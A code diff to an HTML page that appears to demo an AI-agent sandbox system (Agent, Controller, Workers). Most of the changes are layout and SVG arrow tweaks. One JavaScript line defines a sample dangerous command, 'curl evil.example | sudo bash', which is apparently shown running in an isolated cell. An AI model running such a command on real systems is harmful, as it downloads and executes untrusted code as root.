@@ -170,19 +170,25 @@
       position: relative;
       z-index: 1;
       display: grid;
-      grid-template-columns: 1fr 1.4fr;
-      gap: 0.75rem;
+      /* Agent → Controller → Workers */
+      grid-template-columns: minmax(0, 1fr) 32px minmax(0, 1fr) 32px minmax(0, 1.35fr);
+      gap: 0.35rem;
+      align-items: center;
       min-height: 260px;
     }
-    @media (max-width: 560px) {
-      .scene { grid-template-columns: 1fr; }
+    @media (max-width: 640px) {
+      .scene {
+        grid-template-columns: 1fr;
+        justify-items: stretch;
+      }
       .demo { min-height: 0; }
+      .arrow-flow { height: 22px; width: 100%; }
+      .arrow-flow .arr-h { display: none; }
+      .arrow-flow .arr-v { display: block; }
     }
-    .lane {
-      display: flex;
-      flex-direction: column;
-      gap: 0.65rem;
-      justify-content: center;
+    @media (min-width: 641px) {
+      .arrow-flow .arr-v { display: none; }
+      .arrow-flow .arr-h { display: block; }
     }
     .node {
       border: 1px solid rgba(201, 214, 206, 0.16);
@@ -191,6 +197,7 @@
       background: rgba(255, 255, 255, 0.03);
       font-family: "IBM Plex Mono", ui-monospace, monospace;
       font-size: 0.72rem;
+      align-self: center;
     }
     .node strong {
       display: block;
@@ -210,9 +217,12 @@
       border-color: rgba(196, 240, 66, 0.55);
     }
     .arrow-flow {
-      height: 28px;
       position: relative;
-      margin: 0.1rem 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      min-height: 48px;
     }
     .arrow-flow svg { width: 100%; height: 100%; overflow: visible; }
     .arrow-flow .pulse {
@@ -440,29 +450,38 @@
           <span class="demo-step" id="demoStep">idle</span>
         </div>
         <div class="scene">
-          <div class="lane">
-            <div class="node agent" id="nodeAgent">
-              <strong>Agent</strong>
-              <span class="meta">calls create / exec / destroy</span>
-            </div>
-            <div class="arrow-flow" aria-hidden="true">
-              <svg viewBox="0 0 120 28" preserveAspectRatio="none">
-                <path d="M8 14 H112" stroke="rgba(201,214,206,0.25)" stroke-width="1.5" fill="none" />
-                <polygon points="112,14 104,10 104,18" fill="rgba(201,214,206,0.35)" />
-                <circle class="pulse" id="pulse1" r="3.5" cx="8" cy="14" />
-              </svg>
-            </div>
-            <div class="node control" id="nodeControl">
-              <strong>Controller</strong>
-              <span class="meta">schedule · auth · cache hints</span>
-            </div>
-            <div class="arrow-flow" aria-hidden="true">
-              <svg viewBox="0 0 120 28" preserveAspectRatio="none">
-                <path d="M8 14 H112" stroke="rgba(201,214,206,0.25)" stroke-width="1.5" fill="none" />
-                <polygon points="112,14 104,10 104,18" fill="rgba(201,214,206,0.35)" />
-                <circle class="pulse" id="pulse2" r="3.5" cx="8" cy="14" />
-              </svg>
-            </div>
+          <div class="node agent" id="nodeAgent">
+            <strong>Agent</strong>
+            <span class="meta">create / exec / destroy</span>
+          </div>
+
+          <div class="arrow-flow" aria-hidden="true" title="Agent → Controller">
+            <svg class="arr-h" viewBox="0 0 32 80" preserveAspectRatio="none">
+              <path d="M4 40 H28" stroke="rgba(201,214,206,0.35)" stroke-width="1.5" fill="none" />
+              <polygon points="28,40 21,35 21,45" fill="rgba(201,214,206,0.45)" />
+              <circle class="pulse" id="pulse1" r="3" cx="4" cy="40" />
+            </svg>
+            <svg class="arr-v" viewBox="0 0 120 22" preserveAspectRatio="none">
+              <path d="M60 2 V20" stroke="rgba(201,214,206,0.35)" stroke-width="1.5" fill="none" />
+              <polygon points="60,20 56,14 64,14" fill="rgba(201,214,206,0.45)" />
+            </svg>
+          </div>
+
+          <div class="node control" id="nodeControl">
+            <strong>Controller</strong>
+            <span class="meta">schedule · auth · cache</span>
+          </div>
+
+          <div class="arrow-flow" aria-hidden="true" title="Controller → Workers">
+            <svg class="arr-h" viewBox="0 0 32 80" preserveAspectRatio="none">
+              <path d="M4 40 H28" stroke="rgba(201,214,206,0.35)" stroke-width="1.5" fill="none" />
+              <polygon points="28,40 21,35 21,45" fill="rgba(201,214,206,0.45)" />
+              <circle class="pulse" id="pulse2" r="3" cx="4" cy="40" />
+            </svg>
+            <svg class="arr-v" viewBox="0 0 120 22" preserveAspectRatio="none">
+              <path d="M60 2 V20" stroke="rgba(201,214,206,0.35)" stroke-width="1.5" fill="none" />
+              <polygon points="60,20 56,14 64,14" fill="rgba(201,214,206,0.45)" />
+            </svg>
           </div>
 
           <div class="hosts">
@@ -541,7 +560,7 @@
 
       const dangerCmd = "curl evil.example | sudo bash";
       const steps = [
-        { t: 0,    text: "1 · agent → create", run() {
+        { t: 0,    text: "1 · agent → controller (create)", run() {
             resetCell();
             flash(agent); shoot(pulse1);
             cacheA.textContent = "cache · cold";
@@ -549,7 +568,7 @@
             cacheB.classList.add("warm");
             cacheB.textContent = "cache · warm (go-mod)";
           }},
-        { t: 1600, text: "2 · controller places Cell (reuse cache)", run() {
+        { t: 1600, text: "2 · controller → worker (reuse cache)", run() {
             flash(control); shoot(pulse2);
             cacheA.textContent = "cache · pull warm keys";
             cacheA.classList.add("warm");
@@ -587,14 +606,15 @@
       function shoot(dot) {
         if (!dot) return;
         dot.style.opacity = "1";
+        // Horizontal hop: Agent → Controller, or Controller → Workers
         dot.animate(
           [
-            { cx: 8, opacity: 1 },
-            { cx: 108, opacity: 0.2 },
+            { cx: 4, opacity: 1 },
+            { cx: 22, opacity: 0.15 },
           ],
-          { duration: 700, easing: "ease-out" }
+          { duration: 650, easing: "ease-out" }
         );
-        setTimeout(function () { dot.style.opacity = "0"; }, 720);
+        setTimeout(function () { dot.style.opacity = "0"; }, 680);
       }
       function resetCell() {
         cell.classList.remove("show", "danger", "destroy");
